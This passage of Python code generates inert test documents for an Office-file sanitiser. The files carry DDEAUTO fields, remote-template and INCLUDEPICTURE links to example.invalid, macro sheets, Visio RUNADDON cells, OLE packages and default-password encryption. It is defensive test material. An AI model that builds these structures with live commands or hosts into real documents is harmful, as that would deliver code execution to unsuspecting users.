    head = b'Visio (TM) Drawing\r\n'.ljust(0x1a, b'\0') + bytes([version]) + bytes(0x24 - 0x1b)
    body_at = 0x60
    pages = vsd_pointers(vsd_pointer(0x15, body_at if pointer_offset is None else pointer_offset, len(body), 0xd2 if compressed else 0xd0))
    pages_at = body_at + len(body)
    trailer = vsd_pointers(vsd_pointer(0x27, pages_at, len(pages), 0x50))
    trailer_at = pages_at + len(pages)
    head += vsd_pointer(0x14, trailer_at, len(trailer), 0x50)
    return head.ljust(body_at, b'\0') + body + pages + trailer


def visio_vsd(document):
    return cfb([Stream('VisioDocument', document), Stream('\x05SummaryInformation', bytes(48))], root_clsid=VISIO_CLSID)


def ole_files():
    """The binary Office formats, each feature in a file of its own."""
    files = {}
    plain = 'Inert text.\r'
    files['word.doc'] = word_doc(plain)
    files['word-8bit.doc'] = word_doc(plain, compressed=True)
    files['template.dot'] = word_doc(plain, dot=True)
    files['word-password.doc'] = word_doc(plain, encrypted=True)
    # Encrypted Word 97 documents whose DDE field only decryption shows: RC4, RC4 CryptoAPI and XOR obfuscation.
    hidden = '\x13 DDEAUTO inert-app "inert topic" \x14r\x15\r'
    for method in ('rc4', 'cryptoapi', 'xor'):
        files['word-%s.doc' % method] = word_encrypt(hidden, 'inert-password', method)
    files['word6.doc'] = word6_doc(plain)
    files['word6-macros.dot'] = word6_doc(plain, macros=64, dot=True)
    files['word6-dde.doc'] = word6_doc('\x13 DDEAUTO inert-app "inert topic" \x14x\x15\r')
    # A file saved fast, whose DDEAUTO field is split over two pieces stored in reverse order. Read in stored order,
    # the field's name is cut in two.
    files['word6-pieces.doc'] = word6_doc('', pieces=['\x13 DDEAU', 'TO inert-app "inert topic" \x14x\x15\r'])
    fields = ('\x13 DDEAUTO inert-app "inert topic" \x14r\x15'
              '\x13 INCLUDEPICTURE "https://example.invalid/inert.png" \\d \x14\x15'
              '\x13 INCLUDETEXT "C:\\\\inert\\\\local.doc" \x14\x15'
              '\x13 HYPERLINK "https://example.invalid/page" \x14link\x15'
              '\x13 MACROBUTTON InertMacro click \x14\x15'
              '\x13 \x13 QUOTE "DDEAUTO" \x14DDEAUTO\x15 inert-app topic \x14\x15'
              '\x13 PAGE \x14 1\x15\r')
    files['fields.doc'] = word_doc(fields, template='\\\\inert.example.invalid\\share\\inert.dot')
    files['fields-8bit.doc'] = word_doc(fields, compressed=True)
    files['local-template.doc'] = word_doc(plain, template='C:\\Templates\\Inert.dot')
    files['vba.doc'] = word_doc(plain, extra=[Storage('Macros', VBA_PROJECT)])
    files['objects.doc'] = word_doc(plain, extra=[object_pool([
        (ole_object([Stream('\x01Ole10Native', struct.pack('<I', 0) + package_native('inert.txt', 'C:\\inert\\inert.txt', 'C:\\Temp\\inert.txt', b'inert marker'))], user_type='Package', prog_id='Package'), '0003000C-0000-0000-C000-000000000046'),
        (ole_object([Stream('Equation Native', b'inert marker')], user_type='Microsoft Equation 3.0', prog_id='Equation.3'), EQUATION_CLSID),
        ([Stream('\x01CompObj', comp_obj('Inert Control', 'Inert.Control.1')), Stream('\x03OCXNAME', 'InertControl1'.encode('utf-16-le') + b'\0\0'), Stream('contents', b'inert marker')], 'D27CDB6E-AE6D-11CF-96B8-444553540000'),
        (ole_object([], user_type='Inert Link', prog_id='Inert.Link', link=url_moniker(INERT_URL)), None),
        (ole_object([], user_type='Inert Link', prog_id='Inert.Link', link=file_moniker('C:\\inert\\linked.xls')), None),
    ])])
    files['excel.xls'] = xls([('Sheet1', 0, 0x10)])
    files['excel5.xls'] = xls([('Sheet1', 0, 0x10)], book=True, biff8=False)
    files['both-streams.xls'] = cfb([Stream('Workbook', workbook([('Sheet1', 0, 0x10)])), Stream('Book', workbook([('Macro1', 1, 0x40)], biff8=False))])
    files['template.xlt'] = xls([('Sheet1', 0, 0x10)], globals_extra=rec(0x0060))
    files['addin.xla'] = xls([('Sheet1', 0, 0x10)], globals_extra=rec(0x0087))
    files['xlm.xls'] = xls([('Sheet1', 0, 0x10), ('Macro1', 1, 0x40)], globals_extra=lbl('', builtin=1) + lbl('auto_close_inert'))
    files['xlm-bof.xls'] = xls([('Sheet1', 0, 0x10), ('Macro1', 0, 0x40)])
    files['workbook-vba.xls'] = xls([('Sheet1', 0, 0x10)], extra=[Storage('_VBA_PROJECT_CUR', VBA_PROJECT)])
    files['vba-incomplete.xls'] = xls([('Sheet1', 0, 0x10)], extra=[Storage('_VBA_PROJECT_CUR', [Stream('PROJECT', b'inert marker')])])
    files['links.xls'] = xls([('Sheet1', 0, 0x10)], globals_extra=(
        supbook(0, 'inert-app\x03inert topic') + extern_name('A1', 0x7FE2) + extern_name('StdDocumentName', 0x7FEA)
        + supbook(0, 'Inert.Class\x03C:\\inert\\object.bin') + extern_name('StdDocumentName', 0x7FEA)
        + supbook(1, '\x01\x05\x1ehttps://example.invalid/books\x03inert.xls') + supbook(1, '\x01\x01C\x03inert\x03local.xls') + supbook(1, 'relative.xls')
        + rec(0x01AE, struct.pack('<HH', 1, 0x0401)) + supbook(1, ' ')),
        sheet_extra={'Sheet1': obj_macro() + hlink(target='https://example.invalid/page') + hlink(file_path='C:\\inert\\file.txt')})
    files['objects.xls'] = xls([('Sheet1', 0, 0x10)], extra=[Storage('MBD0000ABCD', ole_object([], user_type='Inert Object', prog_id='Inert.Object')), Stream('Ctls', b'inert marker')])
    # InterfaceHdr is one of the records encryption leaves plain.
    files['rc4.xls'] = cfb([Stream('Workbook', biff_encrypt(workbook([('Sheet1', 0, 0x10), ('Macro1', 1, 0x40)], globals_extra=rec(0x00E1, b'\xb0\x04') + lbl('', builtin=1)), 'VelvetSweatshop'))])
    files['cryptoapi.xls'] = cfb([Stream('Workbook', biff_encrypt(workbook([('Sheet1', 0, 0x10)], globals_extra=supbook(0, 'inert-app\x03inert topic') + extern_name('A1', 0x7FE2)), 'VelvetSweatshop', 'cryptoapi'))])
    files['rc4-password.xls'] = cfb([Stream('Workbook', biff_encrypt(workbook([('Sheet1', 0, 0x10)]), 'inert-password'))])
    files['xor.xls'] = cfb([Stream('Workbook', workbook([('Sheet1', 0, 0x10)]).replace(rec(0x000A), rec(0x002F, struct.pack('<HHH', 0, 0x1234, 0x5678)) + rec(0x000A), 1))])
    # PowerPoint: an embedded object stored compressed, a VBA project, a control and actions.
    obj = cfb(ole_object([Stream('Equation Native', b'inert marker')], user_type='Microsoft Equation 3.0', prog_id='Equation.3'), root_clsid=EQUATION_CLSID)
    vba = cfb(VBA_PROJECT)
    ctl = cfb([Stream('\x01CompObj', comp_obj('Inert Control', 'Inert.Control.1')), Stream('contents', b'inert marker')], root_clsid='D27CDB6E-AE6D-11CF-96B8-444553540000')
    ex_list = prec(0x0409, prec(0x040A, struct.pack('<I', 4))
                   + prec(0x0FCC, prec(0x0FC3, struct.pack('<IIIIII', 1, 0, 1, 0, 3, 0)), container=True)
                   + prec(0x0FEE, prec(0x0FC3, struct.pack('<IIIIII', 1, 2, 2, 0, 5, 0)), container=True)
                   + prec(0x0FD7, prec(0x0FD3, struct.pack('<I', 3)) + cstring('Inert', 0) + cstring('https://example.invalid/slide', 1), container=True)
                   + prec(0x1007, prec(0x1005, prec(0x1004, bytes(8)) + cstring('C:\\inert\\movie.avi', 0), container=True), container=True), container=True)
    vba_info = prec(0x03FF, prec(0x0400, struct.pack('<III', 4, 1, 2)), container=True)
    actions = prec(0xF00D, prec(0x0FF2, prec(0x0FF3, struct.pack('<IIBBBBB3x', 0, 0, 2, 0, 0, 0, 0)) + cstring('C:\\Windows\\inert.exe', 2), container=True)
                   + prec(0x0FF2, prec(0x0FF3, struct.pack('<IIBBBBB3x', 0, 0, 1, 0, 0, 0, 0)) + cstring('InertMacro', 2), instance=1, container=True)
                   + prec(0x0FF2, prec(0x0FF3, struct.pack('<IIBBBBB3x', 0, 0, 5, 1, 0, 0, 0)), container=True), container=True)
    files['powerpoint.ppt'] = ppt()
    files['objects.ppt'] = ppt(objects=[(3, ex_ole_stg(obj, True)), (4, ex_ole_stg(vba, False)), (5, ex_ole_stg(ctl, True))], document=ex_list + vba_info, slides=actions)
    files['broken-object.ppt'] = ppt(objects=[(3, prec(0x1011, struct.pack('<I', 100) + b'not zlib data', instance=1)), (4, ex_ole_stg(b'not a compound file', False))], document=prec(0x0409, prec(0x0FCC, prec(0x0FC3, struct.pack('<IIIIII', 1, 0, 1, 0, 3, 0)), container=True), container=True))
    files['presentation-password.ppt'] = ppt(encrypted=True)
    # Encrypted presentations: one with a password, holding a hyperlink only decryption shows, and one with
    # PowerPoint's own default password.
    link = prec(0x0409, prec(0x0FD7, prec(0x0FD3, struct.pack('<I', 3)) + cstring('https://example.invalid/inert', 1), container=True), container=True)
    files['ppt-cryptoapi.ppt'] = ppt(document=link, password='inert-password')
    files['ppt-default.ppt'] = ppt(document=link, password='/01Hannes Ruescher/01')
    files['visio.vsd'] = cfb([Stream('VisioDocument', b'Visio (TM) Drawing\r\n' + bytes(100)), Stream('\x05SummaryInformation', bytes(48))], root_clsid='00021A14-0000-0000-C000-000000000046')
    # Visio 2003 drawings whose ShapeSheet cells call code, and one cell of each kind that does not. The chunk types
    # and block starts are those office-defuse reads: Events 0x84 at 17, Actions 0xA9 at 57, User-defined Cells 0xB4
    # at 15, Scratch 0x9E at 56, Shape Data 0xB6 at 36, Shape Transform 0x9B at 69 and NURBSTo 0xC3 at 61. Smart Tags,
    # 0xC7, is a type whose blocks office-defuse does not know where to find.
    nurbs = b'\x8a' + struct.pack('<dHBBI', 1.0, 3, 0, 0, 1) + struct.pack('<dddd', 1.0, 1.0, 1.0, 1.0)
    branch = b'\xa2' + struct.pack('<I', 40) + b'\xa0' + struct.pack('<I', 8) + b'\x62\x01\x00' + b'\xa3' + struct.pack('<I', 30) + b'\x93'
    cells = (vsd_chunk(0x84, 17, vsd_formula(1, vf_str('Inert')), vsd_block(3, 1, struct.pack('<IIBB', 5, 12, 1, 2)),
                       vsd_formula(2, vf_str('inert.exe'), vf_call(RUNADDON)), vsd_formula(4, vf_str('inert'), vf_str('/x'), vf_call(RUNADDONWARGS)))
             + vsd_chunk(0xa9, 57, vsd_formula(0, vf_str('Inert')), vsd_formula(3, vf_str('Module1.Inert'), vf_call(CALLTHIS, 1)))
             + vsd_chunk(0xb4, 15, vsd_formula(0, branch, vf_str('Inert'), vf_call(RUNMACRO, 1), b'\x90'))
             + vsd_chunk(0x9e, 56, vsd_formula(0, vf_long('x' * 300), vf_call(OPENFILE)))
             + vsd_chunk(0xb6, 36, vsd_formula(0, vf_str('Open'), vf_call(DOOLEVERB)))
             + vsd_chunk(0x9b, 69, vsd_formula(2, b'\x75' + struct.pack('<I', 0x4e), vf_num(0.5), b'\x05\xf0'))
             + vsd_chunk(0xc3, 61, vsd_formula(6, nurbs, vf_call(0xa1, 1)))
             + vsd_chunk(0xc7, 30, vf_call(RUNADDON)))
    files['vsd-cells.vsd'] = visio_vsd(vsd_document(cells))
    # A Visio 2000 drawing, uncompressed, whose strings are 8-bit.
    files['vsd2000-cells.vsd'] = visio_vsd(vsd_document(
        vsd_chunk(0x84, 17, vsd_formula(3, vf_str('inert', False), vf_str('/y', False), vf_call(RUNADDONWARGS)), version=6)
        + vsd_chunk(0xa9, 28, vsd_formula(3, vf_str('inert', False), vf_call(RUNADDON)), version=6), version=6, compressed=False))
    # A call in the trailer of a chunk, where a chunk walk that took the trailer for data would find it.
    files['vsd-between-chunks.vsd'] = visio_vsd(vsd_document(vsd_chunk(0x84, 17, lst=1, trailer=vf_call(RUNADDON) + bytes(7)) + vsd_chunk(0x84, 17)))
    # Structures that do not read, each refused: a cell block longer than its chunk, an unknown token, a chunk longer
    # than its stream, a pointer past the end of the stream, and a pointer list that counts more than it holds.
    files['vsd-block-past-chunk.vsd'] = visio_vsd(vsd_document(vsd_chunk(0x84, 17, struct.pack('<I', 200) + b'\x02\x02\xfe')))
    files['vsd-unknown-token.vsd'] = visio_vsd(vsd_document(vsd_chunk(0x84, 17, vsd_formula(2, b'\xee'))))
    files['vsd-chunk-past-stream.vsd'] = visio_vsd(vsd_document(vsd_chunk(0x84, 17, length=5000)))
    files['vsd-pointer-past-end.vsd'] = visio_vsd(vsd_document(vsd_chunk(0x84, 17), pointer_offset=0x100000))
    doc = bytearray(vsd_document(vsd_chunk(0x84, 17)))
    trailer_at = struct.unpack_from('<I', doc, 0x24 + 8)[0]
    struct.pack_into('<I', doc, trailer_at + 8, 1000)
    files['vsd-pointer-count.vsd'] = visio_vsd(bytes(doc))
    # A drawing that decompresses to 40,000 bytes, most of them one repeated run, for the limits.
    files['vsd-large.vsd'] = visio_vsd(vsd_document(vsd_chunk(0x84, 17) + vsd_chunk(0xc7, 40000)))
    # Message bodies: an RTF body with a DDE field, one whose CRC is wrong, an HTML body, and an embedded message
    # whose own RTF body holds the field.
    dde_rtf = b'{\\rtf1\\ansi{\\field{\\*\\fldinst DDEAUTO inert-app "inert topic"}{\\fldrslt result}}\\par kept text}'
    files['message-rtf-body.msg'] = msg([], rtf_body=compress_rtf(dde_rtf))
    files['message-rtf-crc.msg'] = msg([], rtf_body=compress_rtf(dde_rtf, crc=1))
    files['message-html-body.msg'] = msg([], html_body=b'<html><body><p>inert</p></body></html>')
    inner = [Stream('__properties_version1.0', props([(0x10090102, len(compress_rtf(dde_rtf)))], 24)), Stream('__substg1.0_10090102', compress_rtf(dde_rtf))]
    files['message-embedded-body.msg'] = msg([Storage('__attach_version1.0_#00000000', [Stream('__properties_version1.0', props([(0x37050003, 5)], 8)), Stream('__substg1.0_3707001F', 'inner.msg'.encode('utf-16-le')), Storage('__substg1.0_3701000D', inner)])])
    files['message.msg'] = msg([
        attachment(0, 1, 'inert.txt', 'text/plain', data=b'inert marker'),
        attachment(1, 2, 'linked.txt', path='\\\\inert.example.invalid\\share\\linked.txt'),
        attachment(2, 7, 'web.txt', path='https://example.invalid/web.txt'),
        attachment(3, 5, 'Forwarded', children=[Storage('__substg1.0_3701000D', [Stream('__properties_version1.0', props([], 24)), attachment(0, 1, 'nested.txt', 'text/plain', data=b'inert marker')])]),
        attachment(4, 6, 'object', children=[Storage('__substg1.0_3701000D', ole_object([], user_type='Inert Object', prog_id='Inert.Object'))]),
    ])
    files['template.oft'] = msg([], clsid='0006F046-0000-0000-C000-000000000046')
    files['publisher.pub'] = cfb([Storage('Quill', [Storage('QuillSub', [Stream('CONTENTS', bytes(64))])]), Stream('Contents', bytes(64))], root_clsid='00021201-0000-0000-00C0-000000000046')
    files['publisher95.pub'] = cfb([Stream('Contents', bytes(64)), Storage('Objects', [])], root_clsid='00021201-0000-0000-00C0-000000000046')
    files['project.mpp'] = cfb([Storage('   19', [Stream('Props', bytes(64))]), Stream('Props9', bytes(64)), Storage('_VBA_PROJECT_CUR', VBA_PROJECT)], root_clsid='74B78F3A-C8C8-11D1-BE11-00C04FB6FAF1')
    files['two-formats.doc'] = cfb([Stream('WordDocument', word_doc_stream(plain)), Stream('Workbook', workbook([('Sheet1', 0, 0x10)]))])
    files['bare-object.bin'] = cfb(ole_object([Stream('\x01Ole10Native', struct.pack('<I', 0) + package_native('inert.txt', 'inert.txt', 'inert.txt', b'inert'))], user_type='Package', prog_id='Package'))
    files['agile.xlsx'] = encrypted_package(zip_package('xlsx'), 'VelvetSweatshop')
    files['standard.docx'] = encrypted_package(zip_package('docx'), 'VelvetSweatshop', kind='standard', stub=True)
    files['password.docx'] = encrypted_package(zip_package('docx'), 'inert-password')
    files['extensible.docx'] = cfb([Stream('EncryptionInfo', struct.pack('<HHI', 4, 3, 0)), Stream('EncryptedPackage', bytes(64))])
    files.update(variant_files())
    # A compound file with a ZIP archive after it, which both readers read, and the first sector of one, which only
    # the ZIP reader reads.
    files['zip-polyglot.doc'] = assemble(docx_entries(), prefix=word_doc(plain))
    files['broken-cfb-zip.docx'] = assemble(docx_entries(), prefix=word_doc(plain)[:512])
    return files


def variant_files():
    """Files that take the less common branches of each format: a field, a property or a record missing or cut short."""
    files = {}
    plain = 'Inert text.\r'
    # Word: a WordDocument stream too short for a FIB or holding none, the 0Table stream, a piece table with
    # formatting before it, an empty piece and a cut, and template tables of one string, 8-bit strings, or cut short.
    files['short-fib.doc'] = cfb([Stream('WordDocument', bytes(20))])
    files['not-fib.doc'] = cfb([Stream('WordDocument', bytes(1000))])
    files['fib-cut.doc'] = cfb([Stream('WordDocument', struct.pack('<HH', 0xA5EC, 0xC1) + bytes(28) + struct.pack('<H', 0x7FFF) + bytes(30))])
    files['0table.doc'] = word_doc('\x13 DDEAUTO a b \x14\x15\r', table='0Table')
    dde = '\x13 DDEAUTO a b \x14\x15\r'
    pieces = (b'\x01' + struct.pack('<H', 3) + b'abc' + b'\x02' + struct.pack('<I', 3 * 4 + 2 * 8) + struct.pack('<III', 0, 0, len(dde))
              + struct.pack('<HIH', 0, 1024, 0) + struct.pack('<HIH', 0, 1024, 0))
    files['clx-variants.doc'] = word_doc(dde, clx=pieces)
    files['clx-other.doc'] = word_doc(plain, clx=b'\x05inert')
    files['clx-cut.doc'] = word_doc(plain, clx=b'\x02' + struct.pack('<I', 200) + bytes(10))
    files['assoc-one.doc'] = word_doc(plain, assoc=sttb_unicode(['C:\\Templates\\Only.dot']))
    files['assoc-8bit.doc'] = word_doc(plain, assoc=struct.pack('<HH', 2, 0) + b'\x00' + b'\x11C:\\Templates\\8bit')
    files['assoc-cut.doc'] = word_doc(plain, assoc=struct.pack('<HHH', 0xFFFF, 3, 0) + struct.pack('<H', 50) + b'ab')
    # ObjectPool storages: one with no object streams, one with a CompObj past 64 KiB and an empty OLE stream, a
    # Packager link, a control without a name, a link without a moniker and a Packager link without a source.
    link_no_moniker = struct.pack('<IIIIIII', 0x02000001, 1, 1, 0, 0, 0, 0)
    package_link = lambda source: struct.pack('<I', 0) + struct.pack('<H', 2) + b'linked.txt\0' + source.encode('latin-1') + b'\0' + bytes(8) + b'temp.txt\0'
    files['objects-variants.doc'] = word_doc(plain, extra=[object_pool([
        ([Stream('contents', b'inert marker')], None),
        ([Stream('\x01CompObj', bytes(70000)), Stream('\x01Ole', b'')], None),
        ([Stream('\x01Ole10Native', package_link('C:\\inert\\linked.txt'))], None),
        ([Stream('\x03OCXDATA', b'inert marker')], None),
        ([Stream('\x01Ole', link_no_moniker)], '00000300-0000-0000-C000-000000000046'),
        ([Stream('\x01Ole10Native', package_link(''))], None),
    ])])
    # Excel: a stream that starts with no BOF, an OLE link without a file, a sheet whose BoundSheet points at no BOF, a
    # chart inside a sheet, Obj records without a macro, and a record cut short.
    files['no-bof.xls'] = cfb([Stream('Workbook', rec(0x000A))])
    sheet = (bof(0x10) + bof(0x20) + rec(0x005D, struct.pack('<HH', 0x15, 2) + b'ab' + struct.pack('<HH', 0, 0)) + rec(0x000A)
             + rec(0x005D, struct.pack('<HH', 0x15, 2) + b'ab' + struct.pack('<HH', 0x13, 0)) + rec(0x005D, struct.pack('<HH', 0x15, 2) + b'ab') + rec(0x000A))
    head = bof(5) + supbook(0, 'Inert.Class') + extern_name('StdDocumentName', 0x7FEA)
    bound = lambda pos, name: rec(0x0085, struct.pack('<IBB', pos, 0, 0) + short_xl(name))
    at = len(head) + len(bound(0, 'Sheet1')) + len(bound(0, 'Lost')) + len(rec(0x000A))
    # The second sheet starts four bytes into the BOF record, where no record header is; a record cut short ends the stream.
    files['xls-variants.xls'] = cfb([Stream('Workbook', head + bound(at, 'Sheet1') + bound(4, 'Lost') + rec(0x000A) + sheet + struct.pack('<HH', 0x0204, 100) + b'cut')])
    # Encryption: CryptoAPI with a 40-bit key given as 0 and as 40, with 56 bits, with AES named, a FILEPASS of
    # another version and one cut short; EncryptionInfo cut short, a package cut short or shorter than it says,
    # Standard with RC4 named or cut short, and Agile without a password key, with another cipher, a spin count past
    # the limit, SHA-1 and no salt size, and a package with data after its archive.
    book = workbook([('Sheet1', 0, 0x10)])
    files['cryptoapi-40.xls'] = cfb([Stream('Workbook', biff_encrypt(book, 'VelvetSweatshop', 'cryptoapi', bits=0))])
    # Cell formulas that reach outside: CALL by its function index, and WEBSERVICE by the name Excel 2013 writes
    # for it, a defined name _xlfn.WEBSERVICE called as an add-in function.
    def formula(rgce):
        return rec(0x0006, struct.pack('<HHH', 0, 0, 0) + bytes(8) + struct.pack('<HI', 0, 0) + struct.pack('<H', len(rgce)) + rgce)
    call = b'\x17\x04\x00calc' + b'\x22\x01\x96\x00'
    webservice = b'\x23' + struct.pack('<I', 1) + b'\x17\x08\x00inert.ex' + b'\x22\x02\xff\x00'
    files['formula-functions.xls'] = xls([('Sheet1', 0, 0x10)], globals_extra=lbl('_xlfn.WEBSERVICE'), sheet_extra={'Sheet1': formula(call) + formula(webservice)})
    # XOR obfuscation hides a macro sheet's type in its BoundSheet8, which only decryption shows.
    macro_book = workbook([('Sheet1', 0, 0x10), ('Macro1', 1, 0x40)])
    files['xor-default.xls'] = cfb([Stream('Workbook', biff_encrypt(macro_book, 'VelvetSweatshop', 'xor'))])
    files['xor-password.xls'] = cfb([Stream('Workbook', biff_encrypt(macro_book, 'inert-password', 'xor'))])
    files['cryptoapi-56.xls'] = cfb([Stream('Workbook', biff_encrypt(book, 'VelvetSweatshop', 'cryptoapi', bits=56))])
    files['cryptoapi-aes.xls'] = cfb([Stream('Workbook', biff_encrypt(book, 'VelvetSweatshop', 'cryptoapi', alg=0x660E))])
    files['filepass-version.xls'] = cfb([Stream('Workbook', book.replace(rec(0x000A), rec(0x002F, struct.pack('<HHH', 1, 9, 9)) + rec(0x000A), 1))])
    files['filepass-cut.xls'] = cfb([Stream('Workbook', book.replace(rec(0x000A), rec(0x002F, struct.pack('<HHH', 1, 1, 1) + bytes(10)) + rec(0x000A), 1))])
    package = zip_package('docx')
    encrypted = lambda info, body: cfb([Stream('EncryptionInfo', info), Stream('EncryptedPackage', body)])
    info, body = standard_encrypt(package, 'VelvetSweatshop')
    files['info-cut.docx'] = encrypted(b'\x04\x00', body)
    files['package-cut.docx'] = encrypted(info, b'abc')
    files['package-short.docx'] = encrypted(info, struct.pack('<Q', 1 << 40) + body[8:])
    files['standard-rc4.docx'] = encrypted(standard_encrypt(package, 'VelvetSweatshop', alg=0x6801)[0], body)
    files['standard-cut.docx'] = encrypted(info[:40], body)
    agile_info, agile_body = agile_encrypt(package, 'VelvetSweatshop', spin=1000)
    files['agile-no-key.docx'] = encrypted(agile_info.replace(b'p:encryptedKey', b'p:otherKey'), agile_body)
    files['agile-cipher.docx'] = encrypted(agile_encrypt(package, 'VelvetSweatshop', spin=1000, cipher='DES')[0], agile_body)
    files['agile-spin.docx'] = encrypted(agile_info.replace(b'spinCount="1000"', b'spinCount="10000001"'), agile_body)
    # Hashes OpenSSL's default provider lacks, or that are no hash at all, never reach OpenSSL.
    files['agile-ripemd.docx'] = encrypted(agile_info.replace(b'hashAlgorithm="SHA512"', b'hashAlgorithm="RIPEMD160"'), agile_body)
    files['agile-constructor.docx'] = encrypted(agile_info.replace(b'hashAlgorithm="SHA512"', b'hashAlgorithm="constructor"'), agile_body)
    files['agile-no-bits.docx'] = encrypted(agile_info.replace(b'keyBits="256" ', b'', 1), agile_body)
    # Without the key data's salt the segments' IVs come out wrong, and so does the archive.
    files['agile-no-salt.docx'] = encrypted(re.sub(rb'(<keyData[^>]*?) saltValue="[^"]*"', rb'\1', agile_info), agile_body)
    files['standard-sha256.docx'] = encrypted(info.replace(struct.pack('<III', 0x660E, 0x8004, 128), struct.pack('<III', 0x660E, 0x800C, 128)), body)
    files['standard-bits.docx'] = encrypted(standard_encrypt(package, 'VelvetSweatshop', bits=128)[0].replace(struct.pack('<III', 0x660E, 0x8004, 128), struct.pack('<III', 0x660E, 0x8004, 64)), body)
    files['agile-sha1.docx'] = encrypted_package(package, 'VelvetSweatshop', hash_name='sha1', salt_size=False, spin=1000)
    files['agile-trailing.docx'] = encrypted_package(package + b'inert trailing data', 'VelvetSweatshop', spin=1000)
    files['agile-cfb.docx'] = encrypted_package(package, 'VelvetSweatshop', spin=1000, chaining='cfb')
    # PowerPoint: a current edit that is no UserEditAtom, persist entries past the stream, at a record already read
    # and at the tail of an atom that reads as a container, a record running past the stream, objects whose data is
    # cut short or declares more than the limit, a control without a class id, a VBA project and a control whose
    # storages do not read, and actions, hyperlinks and media without their strings.
    ex = prec(0x0409, prec(0x0FCC, prec(0x0FC3, struct.pack('<IIIIII', 1, 2, 1, 0, 6, 0)), container=True)
              + prec(0x0FD7, prec(0x0FD3, struct.pack('<I', 3)), container=True) + prec(0x1007, prec(0x1005, prec(0x1004, bytes(8)), container=True), container=True)
              + prec(0x0FEE, prec(0x0FC3, struct.pack('<IIIIII', 1, 2, 2, 0, 7, 0)), container=True), container=True)
    vba_info = prec(0x03FF, prec(0x0400, struct.pack('<III', 8, 1, 2)), container=True)
    zero_ctl = cfb([Stream('contents', b'inert marker')])
    # The last 8 bytes of this atom read as a container header whose body is the ExObjList record after it.
    fake = prec(0x0FFE, bytes(32) + struct.pack('<HHI', 0x0F, 0x0FFF, len(ex)))
    # DocumentContainer header, DocumentAtom, then the 32 bytes before the fake header.
    fake_at = 8 + 48 + 8 + 32
    files['ppt-variants.ppt'] = ppt(objects=[(3, prec(0x1011, b'ab', instance=1)), (6, ex_ole_stg(zero_ctl, False)), (7, ex_ole_stg(b'not a compound file', False)), (8, prec(0x1011, b'xx', instance=1))],
                                    document=fake + ex + vba_info, slides=prec(0x0FF2, cstring('lonely', 2), container=True),
                                    extra_persist=lambda offsets: {9: 1 << 30, 10: offsets[2], 11: fake_at})
    files['huge-object.ppt'] = ppt(objects=[(3, prec(0x1011, struct.pack('<I', 0x7FFFFFFF) + zlib.compress(b'x'), instance=1))])
    files['bad-edit.ppt'] = cfb([Stream('PowerPoint Document', prec(0x03E8, b'', container=True) + prec(0x1234, bytes(40))),
                                 Stream('Current User', prec(0x0FF6, struct.pack('<IIIHHBBH', 0x14, 0xE391C05F, 8, 0, 0x03F4, 3, 0, 0)))])
    files['record-past-end.ppt'] = cfb([Stream('PowerPoint Document', prec(0x03E8, b'', container=True) + struct.pack('<HHI', 0, 0x1234, 1000) + b'short')])
    # Outlook: names from the short filename and the display name in 8-bit text, an attachment with no properties, a
    # reference with only the short path, references with no path, and an attachment by value with no data.
    kid = lambda name, data: Stream(name, data)
    files['msg-variants.msg'] = msg([
        Storage('__attach_version1.0_#00000000', [kid('__properties_version1.0', props([(0x37050003, 1)], 8)), kid('__substg1.0_3704001E', b'short.txt'), kid('__substg1.0_37010102', b'inert')]),
        Storage('__attach_version1.0_#00000001', [kid('__substg1.0_3001001F', 'Display'.encode('utf-16-le')), kid('__substg1.0_37010102', b'inert')]),
        Storage('__attach_version1.0_#00000002', [kid('__properties_version1.0', props([(0x37050003, 3)], 8)), kid('__substg1.0_3708001F', 'C:\\inert\\ref.txt'.encode('utf-16-le'))]),
        Storage('__attach_version1.0_#00000003', [kid('__properties_version1.0', props([(0x37050003, 2)], 8))]),
        Storage('__attach_version1.0_#00000004', [kid('__properties_version1.0', props([(0x37050003, 7)], 8))]),
        Storage('__attach_version1.0_#00000005', [kid('__properties_version1.0', props([(0x37050003, 1)], 8)), kid('__substg1.0_3707001F', 'nodata.txt'.encode('utf-16-le'))]),
        Storage('__attach_version1.0_#00000006', [kid('__properties_version1.0', bytes(70000)), kid('__substg1.0_37010102', b'inert')]),
        Storage('__attach_version1.0_#00000007', [kid('__properties_version1.0', props([(0x37050003, 7)], 8)), kid('__substg1.0_370D001F', 'https://example.invalid/w'.encode('utf-16-le'))]),
    ])
    return files


def word_doc_stream(text):
    """The WordDocument stream of word_doc(), for files that need it beside other streams."""
    return fib97(len(text), {}, 0x0200).ljust(1024, b'\0') + text.encode('utf-16-le')


def hexify(b, width=64):
    h = b.hex()
    return '\r\n'.join(h[i:i + width] for i in range(0, len(h), width))


def rtf(body):
    return ('{\\rtf1\\ansi\\ansicpg1252\\deff0{\\fonttbl{\\f0 Times New Roman;}}' + body + '\\par}\r\n').encode('latin-1')


def rtf_object(data, cls, words='\\objemb', objdata_prefix=''):
    return '{\\object%s{\\*\\objclass %s}{\\*\\objdata %s%s}{\\result {\\pict\\wmetafile8 0100}}}' % (words, cls, objdata_prefix, hexify(data))


def rtf_files():
    files = {}
    pkg = ole1('Package', package_native('inert.txt', 'C:\\inert\\inert.txt', 'C:\\Temp\\inert.txt', b'inert marker'))
    eq = ole1('Equation.3', cfb(ole_object([Stream('Equation Native', b'inert marker')], user_type='Microsoft Equation 3.0', prog_id='Equation.3'), root_clsid=EQUATION_CLSID))
    link = ole1('OLE2Link', cfb([Stream('\x01Ole', ole_stream(url_moniker(INERT_URL))), Stream('\x01CompObj', comp_obj('OLE2Link', 'OLE2Link'))], root_clsid='00000300-0000-0000-C000-000000000046'))
    files['plain.rtf'] = rtf('Inert text.')
    files['package.rtf'] = rtf(rtf_object(pkg, 'Package'))
    files['equation.rtf'] = rtf(rtf_object(eq, 'Equation.3', '\\objemb\\objupdate'))
    files['ole2link.rtf'] = rtf(rtf_object(link, 'OLE2Link', '\\objautlink\\objupdate'))
    files['linked.rtf'] = rtf(rtf_object(ole1('Excel.Sheet.8', linked_topic='\\\\inert.example.invalid\\share\\book.xls'), 'Excel.Sheet.8', '\\objlink'))
    files['objocx.rtf'] = rtf('{\\object\\objocx{\\*\\objclass Inert.Control.1}{\\*\\objdata 0105000002000000}}')
    files['not-ole1.rtf'] = rtf('{\\object\\objemb{\\*\\objdata 0102030405}}')
    files['linked-no-data.rtf'] = rtf('{\\object\\objautlink{\\*\\objclass Excel.Sheet.8}}')
    # The obfuscations rtfobj describes: junk and white space in the hex, a dropped digit before \'hh, \bin data, a
    # destination group and an ignorable group inside objdata, and objdata outside any \object.
    h = hexify(eq, 1 << 30)
